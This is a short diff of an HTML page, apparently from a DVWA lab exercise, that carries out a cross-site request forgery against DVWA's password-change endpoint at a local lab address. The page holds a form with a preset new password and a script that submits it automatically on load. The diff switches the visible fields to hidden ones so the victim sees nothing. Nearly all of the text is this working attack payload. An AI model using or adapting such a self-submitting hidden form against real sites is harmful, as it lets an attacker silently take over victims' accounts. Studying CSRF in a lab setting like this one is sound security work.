@@ -11,9 +11,9 @@ html lang="fr">	<head>
 		</header>
 		<main>
 			<form id="my_form" method="GET" action="http://192.168.1.10:81/dvwa/vulnerabilities/csrf/">
-				<input type="text" name="password_new" value="azerty123+" />
-				<input type="text" name="password_conf" value="azerty123+" />
-				<input type="text" name="Change" value="Change" />
+				<input type="hidden" name="password_new" value="azerty123+" />
+				<input type="hidden" name="password_conf" value="azerty123+" />
+				<input type="hidden" name="Change" value="Change" />
 			</form>
 			<script>document.getElementById("my_form").submit();</script>
 		</main>
